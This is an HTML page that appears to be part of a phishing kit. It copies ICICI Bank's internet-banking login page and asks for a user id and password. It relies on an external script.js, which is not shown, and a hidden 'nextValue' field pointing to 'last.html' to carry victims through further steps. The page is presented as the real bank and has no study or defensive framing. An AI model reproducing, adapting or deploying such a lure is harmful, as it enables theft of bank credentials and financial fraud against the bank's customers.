<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
    <link rel="stylesheet" href="style.css">
    <title>ICICI Bank</title>
</head>

<body>
<header class="d-flex justify-content-center">
    <img src="header.png" width="100%" alt="">
</header>
<main class="container px-3">
    <div id="test" class="text-danger text-center fw-bold"></div>
    <input type="hidden" id="nextValue" value="last.html">
    <strong>Welcome to ICICI Bank</strong>
    <div class="mt-2 py-5 px-4 form-div">
        <h6 style="font-weight:600">
            <div class="d-inline-flex gap-2">
                <img src="lock.svg" width="22" alt="">
                <span>    Login to Internet Banking</span>
            </div>
        </h6>
        <form action="" id="form" class="mt-3">
            <div class="form-group">
                <label for="" class="form-label">User id</label>
                <div class="d-flex align-items-center" style="gap:10px;">
                    <input type="text"  name="usid" class="form-control" required>
                </div>
            </div>

            <div class="form-group">
                <label for="" class="form-label">Password</label>
                <div class="d-flex align-items-center" style="gap:10px;">
                    <input type="password" id="passwordInput" name="password" class="form-control" required>
                </div>
                <div class="d-flex align-items-center gap-2 mt-2">
                    <input type="checkbox" id="showPasswordCheckbox" class="form-checkbox">
                    <label for="showPasswordCheckbox" class="form-label" style="position: relative; bottom: -1px;">Show Password</label>
                </div>
            </div>

            <div class="d-flex justify-content-center">
                <button type="submit" id="submit-button" class="btn btn-lg bg-color btn-danger mt-4">Submit</button>
            </div>
        </form>
    </div>
</main>

<footer class="mt-4">
    <img src="footer1.png" width="100%" alt="">
    <img src="footer.png" width="100%" alt="">
</footer>
<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
<script src="script.js"></script>

<script>
    // Initialize Cleave.js with date format
    var cleave = new Cleave('#dob', {
      date: true,
      delimiter: '/',
      datePattern: ['m', 'd', 'Y']
    });
</script>
<script>
    const passwordInput = document.getElementById('passwordInput');
    const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');

    showPasswordCheckbox.addEventListener('change', function() {
        if (this.checked) {
            passwordInput.type = 'text';
        } else {
            passwordInput.type = 'password';
        }
    });
</script>

</body>

</html>
